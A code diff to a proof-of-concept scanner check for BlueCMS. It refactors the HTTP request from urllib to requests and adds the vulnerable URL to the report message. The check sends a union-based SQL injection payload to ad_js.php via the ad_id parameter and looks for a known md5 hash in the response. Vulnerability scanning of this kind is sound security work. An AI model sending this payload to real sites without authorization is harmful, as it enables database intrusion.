@@ -2,10 +2,6 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib.request
-import urllib.error
-import urllib.parse
-
 
 class Vuln(ABVuln):
     vuln_id = 'BlueCMS_0001'  # 平台漏洞编号，留空
@@ -55,12 +51,10 @@ class Poc(ABPoc):
 
             payload = "/ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,md5(3.1415),md5(3.1415)"
             verify_url = self.target + payload
-            req = urllib.request.Request(verify_url)
-
-            content = urllib.request.urlopen(req).read()
+            content = requests.get(verify_url).text
             if '63e1f04640e83605c1d177544a5a0488' in content:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name,url=verify_url))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
